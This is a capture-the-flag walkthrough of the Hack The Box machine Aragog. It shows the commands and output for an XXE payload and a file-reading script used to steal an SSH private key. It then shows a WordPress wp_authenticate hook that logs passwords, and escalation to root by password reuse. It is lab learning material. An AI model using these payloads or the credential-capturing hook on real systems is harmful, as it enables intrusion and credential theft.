# Target
| Category          | Details                                              |
|-------------------|------------------------------------------------------|
| 📝 **Name**       | [Aragog](https://app.hackthebox.com/machines/Aragog) |  
| 🏷 **Type**       | HTB Machine                                          |
| 🖥 **OS**         | Linux                                                |
| 🎯 **Difficulty** | Medium                                               |
| 📁 **Tags**       | XXE, LFI, WordPress, wp_authenticate hook            |

### User flag

#### Scan target with `nmap`
```
┌──(magicrc㉿perun)-[~/attack/HTB Aragog]
└─$ nmap -sS -sC -sV -p- $TARGET
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-18 13:58 +0100
Nmap scan report for 10.129.4.45
Host is up (0.025s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-r--r--r--    1 ftp      ftp            86 Dec 21  2017 test.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.14.16
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ad:21:fb:50:16:d4:93:dc:b7:29:1f:4c:c2:61:16:48 (RSA)
|   256 2c:94:00:3c:57:2f:c2:49:77:24:aa:22:6a:43:7d:b1 (ECDSA)
|_  256 9a:ff:8b:e4:0e:98:70:52:29:68:0e:cc:a0:7d:5c:1f (ED25519)
80/tcp open  http    Apache httpd 2.4.18
|_http-title: Did not follow redirect to http://aragog.htb/
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: Host: aragog.htb; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.65 seconds
```

#### Discover `aragog.htb` virtual host
```
┌──(magicrc㉿perun)-[~/attack/HTB Aragog]
└─$ curl -I http://10.129.4.45
HTTP/1.1 301 Moved Permanently
Date: Wed, 18 Mar 2026 12:58:49 GMT
Server: Apache/2.4.18 (Ubuntu)
Location: http://aragog.htb/
Content-Type: text/html; charset=iso-8859-1
```

#### Add `aragog.htb` to `/etc/hosts`
```
┌──(magicrc㉿perun)-[~/attack/HTB Aragog]
└─$ echo "$TARGET aragog.htb" | sudo tee -a /etc/hosts
10.129.4.45 aragog.htb
```

#### Enumerate FTP server
```
┌──(magicrc㉿perun)-[~/attack/HTB Aragog]
└─$ ftp anonymous@aragog.htb
Connected to aragog.htb.
220 (vsFTPd 3.0.3)
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||44039|)
150 Here comes the directory listing.
-r--r--r--    1 ftp      ftp            86 Dec 21  2017 test.txt
226 Directory send OK.
ftp> get test.txt
local: test.txt remote: test.txt
229 Entering Extended Passive Mode (|||44146|)
150 Opening BINARY mode data connection for test.txt (86 bytes).
100% |*******************************************************************************************************************************************************|    86       88.03 KiB/s    00:00 ETA
226 Transfer complete.
86 bytes received in 00:00 (2.53 KiB/s)
ftp> exit
221 Goodbye.
```

#### Read exfiltrated `test.txt` file
```
┌──(magicrc㉿perun)-[~/attack/HTB Aragog]
└─$ cat test.txt   
<details>
    <subnet_mask>255.255.255.192</subnet_mask>
    <test></test>
</details>
```

#### Enumerate web application
```
┌──(magicrc㉿perun)-[~/attack/HTB Aragog]
└─$ feroxbuster --url http://aragog.htb/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x php,html,js,png,jpg,py,txt,log -C 404
<SNIP>
200      GET        3l        6w       46c http://aragog.htb/hosts.php
<SNIP>
```

#### Access discovered `/hosts.php` endpoint
```
┌──(magicrc㉿perun)-[~/attack/HTB Aragog]
└─$ curl http://aragog.htb/hosts.php   

There are 4294967294 possible hosts for
```
This seems to be an output of some subnet calculator, which might be related to discovered `test.txt` file. 

#### Pass `test.txt` to `/hosts.php` endpoint
```
┌──(magicrc㉿perun)-[~/attack/HTB Aragog]
└─$ curl http://aragog.htb/hosts.php -H "Content-Type: application/xml" --data-binary @test.txt

There are 62 possible hosts for 255.255.255.192
```
Output is different, meaning that `test.txt` has been processed. Since input is XML we could try XXE attack vector.

#### Prepare XXE payload
```
┌──(magicrc㉿perun)-[~/attack/HTB Aragog]
└─$ cat <<'EOF'> xxe.xml                                                                             
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<details>
    <subnet_mask>&xxe;</subnet_mask>
</details>
EOF
```

#### Pass `xxe.xml` to `/hosts.php` endpoint
```
┌──(magicrc㉿perun)-[~/attack/HTB Aragog]
└─$ curl http://aragog.htb/hosts.php -H "Content-Type: application/xml" --data-binary @xxe.xml    

There are 4294967294 possible hosts for root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
uuidd:x:107:111::/run/uuidd:/bin/false
lightdm:x:108:114:Light Display Manager:/var/lib/lightdm:/bin/false
whoopsie:x:109:117::/nonexistent:/bin/false
avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/false
colord:x:113:123:colord colour management daemon,,,:/var/lib/colord:/bin/false
hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false
kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
pulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false
rtkit:x:118:126:RealtimeKit,,,:/proc:/bin/false
saned:x:119:127::/var/lib/saned:/bin/false
usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
florian:x:1000:1000:florian,,,:/home/florian:/bin/bash
cliff:x:1001:1001::/home/cliff:/bin/bash
mysql:x:121:129:MySQL Server,,,:/nonexistent:/bin/false
sshd:x:122:65534::/var/run/sshd:/usr/sbin/nologin
ftp:x:114:130:ftp daemon,,,:/srv/ftp:/bin/false
```
`/etc/passwd` returned in output confirms XXE vulnerability.

#### Prepare `lfi.sh` exploit
```
┌──(magicrc㉿perun)-[~/attack/HTB Aragog]
└─$ { cat <<'EOF'> lfi.sh
curl -s http://aragog.htb/hosts.php -H "Content-Type: application/xml" --data-binary '<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file://'${1}'">
]>
<details>
    <subnet_mask>&xxe;</subnet_mask>
</details>' | head -n -2 | tail -n +2 | sed 's/^There are 4294967294 possible hosts for //'
EOF
} && chmod +x lfi.sh
```

#### Exfiltrate SSH private key for user `florian`
```
┌──(magicrc㉿perun)-[~/attack/HTB Aragog]
└─$ ./lfi.sh /home/florian/.ssh/id_rsa > florian_id_rsa && chmod 600 florian_id_rsa
```

#### Access target over SSH using private key for user `florian`
```
┌──(magicrc㉿perun)-[~/attack/HTB Aragog]
└─$ ssh -i florian_id_rsa florian@aragog.htb 
<SNIP>
florian@aragog:~$ id
uid=1000(florian) gid=1000(florian) groups=1000(florian)
```

#### Capture user flag
```
florian@aragog:~$ cat /home/florian/user.txt 
c11fc0b6fbbfa4be46039167851b2bc6
```

### Root flag

#### Discover WordPress running at `/dev_wiki`
```
florian@aragog:~$ ls -l /var/www/html/
total 24
drwxrwxrwx 5 cliff    cliff     4096 Mar 18 08:25 dev_wiki
-rw-r--r-- 1 www-data www-data   689 Dec 21  2017 hosts.php
-rw-r--r-- 1 www-data www-data 11321 Dec 18  2017 index.html
drw-r--r-- 5 cliff    cliff     4096 Sep 12  2022 zz_backup
```

```
┌──(magicrc㉿perun)-[~/attack/HTB Aragog]
└─$ curl -I http://aragog.htb/dev_wiki/                 
HTTP/1.1 200 OK
Date: Wed, 18 Mar 2026 15:36:30 GMT
Server: Apache/2.4.18 (Ubuntu)
Link: <http://aragog.htb/dev_wiki/index.php/wp-json/>; rel="https://api.w.org/"
Link: <http://aragog.htb/dev_wiki/>; rel=shortlink
Content-Type: text/html; charset=UTF-8
```

#### Discover `wp-login.py` being executed every 1 minute
```
2026/03/18 08:26:01 CMD: UID=1001  PID=38031  | /usr/bin/python3 /home/cliff/wp-login.py 
2026/03/18 08:26:01 CMD: UID=1001  PID=38030  | /bin/sh -c /usr/bin/python3 /home/cliff/wp-login.py 
2026/03/18 08:26:01 CMD: UID=0     PID=38029  | /usr/sbin/CRON -f 
2026/03/18 08:27:01 CMD: UID=1001  PID=38036  | /usr/bin/python3 /home/cliff/wp-login.py 
2026/03/18 08:27:01 CMD: UID=1001  PID=38035  | /bin/sh -c /usr/bin/python3 /home/cliff/wp-login.py 
2026/03/18 08:27:01 CMD: UID=0     PID=38034  | /usr/sbin/CRON -f 
```

#### Check write permissions to `/wp-includes/functions.php`
```
florian@aragog:~$ ls -l /var/www/html/dev_wiki//wp-includes/functions.php
-rwxrwxrwx 1 cliff cliff 179882 Mar 18 08:40 /var/www/html/dev_wiki//wp-includes/functions.php
```
With write permissions to `functions.php` we could add `wp_authenticate` hook which will capture credentials.

#### Add hook for credentials capture
```
florian@aragog:~$ cat <<'EOF' >> /var/www/html/dev_wiki//wp-includes/functions.php
add_action('wp_authenticate', function($username, $password) {
    $data = "User: $username | Pass: $password\n";
    file_put_contents('/tmp/credentials.txt', $data, FILE_APPEND);
}, 10, 2);
EOF
```

#### Wait for `/home/cliff/wp-login.py` to be executed and read `/tmp/credentials.txt`
```
florian@aragog:~$ cat /tmp/credentials.txt 
User: Administrator | Pass: !KRgYs(JFO!&MTr)lf
```

#### Escalate to `root` user by reusing discovered password
```
florian@aragog:~$ su
Password: 
root@aragog:/home/florian# id
uid=0(root) gid=0(root) groups=0(root)
```

#### Capture root flag
```
root@aragog:~# cat /root/root.txt 
a1fc84ab000f49dad41ec87f9a9df5e6
```
